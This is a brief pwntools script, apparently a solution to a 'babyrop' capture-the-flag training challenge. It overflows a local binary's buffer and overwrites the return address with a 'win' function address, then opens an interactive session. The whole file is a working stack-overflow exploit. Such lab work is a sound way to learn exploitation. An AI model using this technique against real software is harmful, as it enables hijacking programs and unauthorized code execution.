from pwn import *

binary = './babyrop_level1.1'

p = process(binary)

win_addr = 0x00000000004020cf

#gdb.attach(p, '''
#b * challenge
#''')

offset = 0x40 + 8
payload = flat(
	b'A' * offset,
	p64(win_addr)
)
p.sendline(payload)
p.interactive()
